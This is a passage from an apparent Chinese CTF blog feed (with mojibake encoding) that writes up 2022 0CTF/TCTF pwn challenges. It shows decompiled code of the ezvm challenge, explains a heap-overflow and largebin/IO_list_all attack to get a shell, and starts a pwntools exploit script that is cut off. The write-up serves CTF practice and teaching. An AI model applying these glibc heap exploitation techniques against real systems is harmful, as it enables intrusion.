e89a8196c57ee547e7fa3d2ef9c311b7ec903566d595323cdf3239d2b4036155dbe92062ab965add40887d67ac58bd2a412de2168627e1104165a83e9d8023cc51a428e0c1ea41a042b6d0d0bf67a830654ec45c94a5cf0ca355e15eddc95eb3a2997f64593f4988a15f72d37a239ea865cf6310a143f8d08ea89b316a91dd2dc0c0163c01dcf3b0e7fb22d565e57aecdcb7acb022fc11198c64930f1d5fff2566247fc1ec1b4b7ab4d865623e9f8f1e7cf117675634e0bde46fa4ac600f52ba816b7fd0d0f3d0ae949f1253405474a89bbf3666b5f8f06bea1a616aa21ec0e457468df12c810cc36459f627a830442ea21cec0e732b0802365350b019c9fc9e96b8e264e658a3619580b2e3330915e56e4307fd9fda24ac403acc457c61702b95c34771e5701f18ee1d68b34b8de30a7f667e93ce1e6605590329fc65236c598ee937285a285bea3bc88651b0b05221fdc1b757aa5b97e8a6f9d003f75032a548c4deca3405cfe0e3920868c4f6f3235444848aeefc3f47d91f33d0a4ef9352304da04941374d7229694d00be00e1d492409b263dc19a0763e0391ba089f0e66290e7ab02bcc08df609e57688ba88532181ba55cea9aeafbb232a5c68bb2d4e7f3d4d27b644dce3a0ffe90cc91edb8a81b19107695e108dc7d24d8269c2835cbe08f644d238ddbdc77968f956eb2ed132b2f088c13e7a96e63754cde59aa5c11e7e474c5265605cad162fc7218635bdd64269c74855f459e0280ccb5f159aa4c18eadc8a0c887826f58acf7b32125e252f66cbe856a863104bac1b35907de0b0b8bf89fb42c16e6efc91cab1c97aa685a2f625fd4d71f2eff004432353ca2fd12beaf0efe233e553c836fec1094fac3ff7a8b26e2530e0fc3b959bb7036f849d52e3697c2bde2d582cde432616610865a63ac095408a031a3a98e683007700980959ce24827b23997fa5da447c6af058c0c0d4a6db573cf56228d4996b29c73a0792ad4a61b7912a52efdace856219ce8a7150a21dba9f9dd1c1c3686267910a3f9e9c189e0c3a8138d6e8dae4709c7f15cf5695b6adf23eb99897fc260e55c303b4ec978f2bcaee5c37b41a4496b68d59212b9d86085348d27b62e1df451a9ff883e74174a7406b4616baeb23225c4ac38603579556f947fc160c76d4c00753333372aaa42c704876833178d81c83c86e308fe63c5b2037a64ffc348df3d0a302aa711884e84f118e132d4617b88525ab98ca5e3ccc8e9ee743318731f0d0ccfb42b752010fac7d2a3b2a3ae811e749d7f56707d3cc0db65a6e3d936525ea3d60cec2dc82f8ae0fafa81f4d4cbcf0a5f94a414a4e010e7a481da2fc3ba0fad28715fbfb93915de2c594899449d02d54acb901e239d4d8b95528a315d664996602a64ca281b594fd296f66c071f4ec75b30f0084fc2755e51b4622bd24ac203edf9df3da7260427aa320b929d7dcb29a22150a9787bfe12bfb1b5b96b8ddec2f378e270cdc91a759d4c0756e2f88206b9281357c46d3fd38a9b49c9288cb6d8ef47c9ae423c97539ac8b6f360370e077a4043d6e21b0647c716e0dc79664b8bd5a6def0ae64fbd022793c3ef4e7f1b03972ddcd73982af5aebb238db9550e5daae3cfce524d85920c7d8630a0a89642c5379adf57b91a203b58091c8f67cdd822e024bcb8860f38cd09a8fa0f0d9b2039db71c92d16dca91c349e7f15a187e4eddca3ba7a33535aff3f59ff8c007d65eea00908e0e4f953334a8f7ca09a9307471225ba35ec5beae12ec5f7cd4fbe67ef8d3c72f1dd546793ce8b02e8eba2001342d63d7365301fb4d9b01bffcb20729abb715336762c78b1d228b2097d5b31627183a45d1fda233f1d739a9e7cee54443c6b81e33226f24b2e787e3c093bdb2470e0c92cf5efd1a66793bbef2f8f1baf4d01653200f19ef8603643d1d7319b84e3f999e6cb65a4e86efe392b99f97cd863c574351e08dba2dc32c5219d575aa5515fc944d8b8e91785cd7680d360b115689805cb968cb7d64642bcd62ce6d9685787381a310fb1265eafe4e2b6710648036cebd71cb9115431ff61e0b60d22be561eb249af67bb5775221a4adf7f3fb152ff2c0a1032c54ac845e70c11999e66a0a3d347d8b2804f439caf14c42e7ab652072eea95007988b93528d68f51a1c5dd345cef1f8c0ebff58f3e6bdaa38d513b3180869c2043ee288ed4c75bb20be7babcf0ab935ed0752a5b731fddc17b59b814fad97ab7de92d7300441527a990a2700eb1c7cf1334020cc0fa1ff69c2d05839548725369959fd4781aba8522cea2ed160eab401e4cb3cd5d0238d3937ec2b1906bf3bd4947234c6196602b19be85e809ea1563095034cb4df40ee95788e3cd9b4a753dcbeb227bf30b32e16c37487ad9d42770d8b0bd7f1128f6ad375c005f7a4583f05169beeff91699cbd4f5d1bb3fbe4b0f84c54579ba42d46ef5f1b0d49e627e64b9f2c2c25ab61dbdb0e9b5a09287d4ca9c62a1b7f59f7662132bf5f4c225bf6b77a823c0ed8bed3e9f1b949d69afac20242d84a18e12d7374080520297ebb86f127cd8800b33218252d093201e43d05f120702cb4e230c4e741861354b7452b67debecb5b4257917d3d37902bccbcabdb5258cb299aa0796a8fcb5eb1edf7c70d9e11fb141e0011034f2a74b1a4b3baae2650eaf4adec4a52ff50ce9126e4efa6020a43a19cc51325aa6cf2b4d436a94df5aa1d604e8fd68f9751b2bcf324d0e0c03e1e66e67bdc2457012f39ceab1e13a2ffd7b35ed55098b090d189362fea96f7b4223f1009cfe21a477326a9b65a8af0e673ca259ee272ee6e7d01c046b0c7852aefffff4ee9f694ee9ed6edf4e6a3793322cdf5e5f04ef48a3c4fd325f5368b830d68d888d3aa2839cc3623ad790bac187ef4032a84badac1bacc9d66827391d90ae11b1b968caa1a3fdd780c7ee2efbc9e19383cbfd9662357114248e09fc39b30f33cf49cc2b86d5ce27deecbb17f96d5563ef0050de863a9b241be534efd1457b09153016c1a6755af74d46db35c28fee7e309b63718de30f8b7da1c200329868682477476757354fedbe1d874d6f59e9616d198c8688df15e7f278eafb5f06555d1f838080f981161c036c2104425948f247342e51b43fcd5e06968a7daf1299bfb60ea8a6a4afbb73c8d23aaaf0619ac44d5ffa4b7ec9a7d3ef6f15002cf07629452203a4f5c32079629958e956d98c689ac6738ba346c362eb81357747ebd7ad5fe1cd98e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">è¿˜æ²¡æœ‰å†™è‡ªå·±çš„ä¸œè¥¿</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 0CTF/TCTF éƒ¨åˆ†èµ›é¢˜è§£</title>
    <link href="/posts/ca1d58fb.html"/>
    <url>/posts/ca1d58fb.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>glibc å°å°åšé¢˜å®¶ï¼Œä»€ä¹ˆæ—¶å€™æ‰èƒ½å’Œå¤§å¸ˆå‚…ä»¬ä¸€æ ·å®¡æºç ç§’é¢˜å‘œå‘œå‘œ ( á—œ Ë° á—œ )</p></blockquote><p>æˆ‘åœ¨æ¯”èµ›ä¸­åªåšå‡ºäº† BabyHeap å’Œ ezvmï¼Œå…¶ä»–é¢˜è¿˜åœ¨å¤ç°ï¼ˆæ²¡å’•çš„è¯ï¼‰ã€‚</p><h2 id="babyheap2022ï¼ˆ35-Solvedï¼‰"><a class="header-anchor" href="#babyheap2022ï¼ˆ35-Solvedï¼‰">Â¶</a>babyheap2022ï¼ˆ35 Solvedï¼‰</h2><p>2.35 çš„å †æº¢å‡ºï¼Œæ´’æ´’æ°´å•¦ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220920122906462.png" alt="babyheap2022"></p><h3 id="é¢˜ç›®æè¿°"><a class="header-anchor" href="#é¢˜ç›®æè¿°">Â¶</a>é¢˜ç›®æè¿°</h3><p>Hooks are wiped.</p><p>Pointers are mangled.</p><p>Skills are to be replenished.</p><p><a href="https://drive.google.com/file/d/1iC36vnQ8DgE7dTV7jinWOU4SiG-W4mVp/view?usp=sharing">babyheap</a></p><p>Update: The file is updated to include the running environment.</p><h3 id="æ€è·¯"><a class="header-anchor" href="#æ€è·¯">Â¶</a>æ€è·¯</h3><p>ä¸€æ¬¡æ‰“ fskeyï¼Œä¸€æ¬¡æ‰“ tls_dtor_listï¼Œæ¯”è¾ƒç®€å•ï¼Œä¸æ”¾ exp äº†=.=</p><p>å¯ä»¥çœ‹çœ‹ <a href="https://ctftime.org/event/1717/tasks/">ctftime</a> ä¸Šå…¶ä»–å¸ˆå‚…å†™çš„ã€‚</p><h2 id="ezvm-29-Solved"><a class="header-anchor" href="#ezvm-29-Solved">Â¶</a>ezvm(29 Solved)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220920121121665.png" alt="ezvm"></p><h3 id="é¢˜ç›®æè¿°-v2"><a class="header-anchor" href="#é¢˜ç›®æè¿°-v2">Â¶</a>é¢˜ç›®æè¿°</h3><p>Enjoy a game with virtual machine!</p><p><a href="https://drive.google.com/file/d/1zJzZSx_fCxgTnOXwaDpsmtztBSohXkFU/view?usp=sharing">attachment</a></p><h3 id="é¢˜ç›®åˆ†æ"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ">Â¶</a>é¢˜ç›®åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">do_things</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 size; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">void</span> *a1; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> __int64 a4; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-type">void</span> *a2; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  write_n(<span class="hljs-string">&quot;Please input your code size:&quot;</span>);<br>  size = try_LONG();<br>  <span class="hljs-keyword">if</span> ( size &gt;= <span class="hljs-number">0x200</span> )<br>    Error(<span class="hljs-string">&quot;too much!&quot;</span>);<br>  a1 = <span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> ( !a1 )<br>    Error(<span class="hljs-string">&quot;malloc failed!&quot;</span>);<br>  write_n(<span class="hljs-string">&quot;Please input your memory count:&quot;</span>);<br>  a4 = try_LONG();<br>  <span class="hljs-keyword">if</span> ( a4 &gt;= <span class="hljs-number">0x200000000000000</span>LL )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !only_chance )<br>      Error(<span class="hljs-string">&quot;bye bye! bad hacker!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK, only one chance.&quot;</span>);<br>    only_chance = <span class="hljs-number">0</span>;<br>  &#125;<br>  a2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span> * a4);                          <span class="hljs-comment">// overflow</span><br>  <span class="hljs-keyword">if</span> ( !a2 )<br>    Error(<span class="hljs-string">&quot;malloc failed!&quot;</span>);<br>  write_n(<span class="hljs-string">&quot;Please input your code:&quot;</span>);<br>  read_n((__int64)a1, size);<br>  vm_init(a1, a2, size, a4);<br>  vm_run();<br>  vm_free();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vm_run</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int8 v1; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v2; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 reg_id; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  __int64 mem_id; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">void</span> *v9; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  __int64 v10; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  __int64 v11; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  __int64 v12; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( vm_ip &lt; Code_size )<br>    &#123;<br>      v6 = (<span class="hljs-type">char</span>)CODE[vm_ip++];<br>      <span class="hljs-keyword">switch</span> ( v6 )<br>      &#123;<br>...<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">20</span>:<br>          v3 = CODE[vm_ip];<br>          v9 = *(<span class="hljs-type">void</span> **)&amp;CODE[++vm_ip];<br>          vm_ip += <span class="hljs-number">8LL</span>;<br>          <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">4u</span> )<br>            Error(<span class="hljs-string">&quot;oveflow!&quot;</span>);<br>          *(&amp;Memory_ptr_while_regs + (<span class="hljs-type">char</span>)v3 + <span class="hljs-number">4</span>) = v9;<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">21</span>:<br>          v4 = CODE[vm_ip];<br>          v7 = *(_QWORD *)&amp;CODE[++vm_ip];<br>          vm_ip += <span class="hljs-number">8LL</span>;<br>          <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">3u</span> || v7 &lt; <span class="hljs-number">0</span> || v7 &gt;= Memory_size )<br>            Error(<span class="hljs-string">&quot;oveflow!&quot;</span>);<br>          *((_QWORD *)Memory_ptr_while_regs + v7) = *(&amp;Memory_ptr_while_regs + (<span class="hljs-type">char</span>)v4 + <span class="hljs-number">4</span>);<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">22</span>:<br>          reg_id = CODE[vm_ip];<br>          mem_id = *(_QWORD *)&amp;CODE[++vm_ip];<br>          vm_ip += <span class="hljs-number">8LL</span>;<br>          <span class="hljs-keyword">if</span> ( reg_id &gt; <span class="hljs-number">3u</span> || mem_id &lt; <span class="hljs-number">0</span> || mem_id &gt;= <span class="hljs-number">8</span> * Memory_size / <span class="hljs-number">8</span> )<br>            Error(<span class="hljs-string">&quot;oveflow!&quot;</span>);<br>          *(&amp;Memory_ptr_while_regs + (<span class="hljs-type">char</span>)reg_id + <span class="hljs-number">4</span>) = (<span class="hljs-type">void</span> *)*((_QWORD *)Memory_ptr_while_regs + mem_id);<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">23</span>:<br>          <span class="hljs-keyword">return</span> write_n(<span class="hljs-string">&quot;finish!&quot;</span>);<br>        <span class="hljs-keyword">default</span>:<br>          write_n(<span class="hljs-string">&quot;what???&quot;</span>);<br>          <span class="hljs-keyword">continue</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> write_n(<span class="hljs-string">&quot;finish!&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ç°äº†ä¸€ä¸ªå¸¦å †ç©çš„è™šæ‹Ÿæœºï¼Œç»™äº†ä¸€æ¬¡æº¢å‡ºæœºä¼š</p><p>å…¶ä»–çš„åŠŸèƒ½æ¯”è¾ƒæ­£å¸¸ï¼Œå°±æ˜¯å¼€è¾Ÿçš„è™šæ‹Ÿæœºå¯„å­˜å™¨å’Œæ ˆä¹‹é—´çš„ä¸€äº›åŠ å‡ä¹˜é™¤ä½è¿ç®—æ¯”å¤§å°è¿™äº›å¸¸è§„æ“ä½œã€‚</p><p>éœ€è¦æ³¨æ„çš„é—®é¢˜ï¼š</p><ol><li>æ¯æ¬¡å †å—ç”³è¯·çš„é¡ºåºæ˜¯ CODEã€Memoryã€Stackï¼Œé‡Šæ”¾é¡ºåºæ˜¯ Memoryã€CODEã€Stackï¼ŒStack å¸¸è§„æƒ…å†µä¸‹éƒ½ä¼šä¸ Top Chunk åˆå¹¶</li><li>æº¢å‡ºç»“åˆ <code>case 21</code> å¯ä»¥é€ æˆå †ä¸Šä»»æ„å†™ã€‚ç”±äºåˆ¤æ–­æ˜¯ <code>mem_id &gt;= 8 * Memory_size / 8</code> ï¼Œæƒ³åˆ©ç”¨ <code>case 22</code> è¶Šç•Œè¯»æ˜¯ä¸è¡Œçš„ =.=</li><li>å¦‚æœç”³è¯·çš„å †å—å¤§å°æº¢å‡ºåå¤§äº <code>0x200000</code>ï¼Œåˆ™å¯ä»¥åœ¨ libc ä¸Šè¶Šç•Œå†™</li></ol><h3 id="æ€è·¯ä¸€-Master-of-Glibcï¼ˆbushiï¼‰"><a class="header-anchor" href="#æ€è·¯ä¸€-Master-of-Glibcï¼ˆbushiï¼‰">Â¶</a>æ€è·¯ä¸€ Master of Glibcï¼ˆ<s>bushi</s>ï¼‰</h3><p>æ€è·¯ä¸€æ˜¯æˆ‘æ¯”èµ›æ—¶çš„æ€è·¯ï¼Œï¼ŒæŒºå¤æ‚çš„ï¼Œè€Œä¸”æ…¢ã€‚å½“æ—¶ç¡®å®æ²¡æƒ³åˆ°ä»€ä¹ˆå¥‡å¥‡æ€ªæ€ªçš„ç®€å•æ–¹æ³•ï¼Œå°±ç›´æ¥ä¸€è‚¡è„‘å¾€ä¸‹åšäº†ï¼Œå †é£æ°´è°ƒäº†å¾ˆé•¿æ—¶é—´qwqï¼Œæ²¡æœ‰æƒ³åˆ°èµ° mmap åˆ†é…åˆ° libc ä¸Šé¢è¿™æ ·å­ã€‚</p><ol><li>åˆ©ç”¨æ¯æ¬¡ç”³è¯·çš„ code size ä¸åŒï¼Œå¸ƒç½®å †é£æ°´ã€‚åˆ©ç”¨ä¸€æ¬¡æº¢å‡ºï¼ŒåŒæ—¶å¸ƒç½®å‡ ä¸ªsizeï¼Œç¡®ä¿ free ä¸ä¼šå‡ºé”™ï¼Œå¹¶æ„é€ å †å—é‡å ï¼ŒåŒæ—¶å¸ƒç½®å¥½ä¸€ä¸ª Largebin å’Œä¸€ä¸ª Unsortedbinã€‚</li><li>å †å—é‡å åï¼Œè¯»å– libc åœ°å€å’Œ heap åŸºå€ï¼Œé€šè¿‡å¯„å­˜å™¨å…¥æ ˆï¼Œæ ˆé‡Œè®¡ç®—å†å‡ºæ ˆï¼Œå¯„å­˜å™¨é€å…¥ memory ä¸€ç³»åˆ—æ“ä½œï¼Œä¿®æ”¹ Largebin çš„ bk ä¸º <code>_IO_list_all - 0x20</code>ï¼Œç„¶åå¸ƒç½®å¥½ IO é“¾å­å·´æ‹‰å·´æ‹‰ï¼Œæœ€å exit getshell</li></ol><h4 id="Exp"><a class="header-anchor" href="#Exp">Â¶</a>Exp</h4><p>äº¤äº’éƒ¨åˆ†æ˜¯æŠ„çš„å¤§å¸ˆå‚…çš„ï¼Œæ•´ç†äº†è‡ªå·±æ¯”èµ›æ—¶å€™çš„æ€è·¯ï¼Œç¨å¾®å¥½çœ‹ç‚¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ezvm&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># p = process(&#x27;./ezvm&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;&quot;</span>,)<br><br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">1</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">4</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">8</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">And</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> 